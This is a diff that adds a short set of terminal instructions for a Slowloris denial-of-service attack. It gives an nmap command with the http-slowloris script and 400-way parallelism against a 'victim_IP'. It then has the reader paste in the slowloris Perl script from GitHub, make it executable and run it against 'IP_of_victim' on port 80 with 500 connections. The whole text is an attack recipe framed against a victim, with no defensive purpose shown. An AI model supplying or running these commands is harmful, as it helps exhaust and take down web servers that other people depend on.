@@ -1,0 +1,15 @@
+1) checking vulnerability of slowloris::::::
+     :::in terminal:::
+
+            nmap --script http-slowloris --max-parallelism 400 victim_IP -vv
+
+2) download pearl script for slowloris , you can get it at github :::::
+         :::in terminal:::
+              
+                 nano slowloris.pl
+                 paste in script and give executeable permission
+   
+          :::in terminal:::
+                 
+                ./ slowloris.pl -dns IP_of_victim -port 80 -num 500
+         
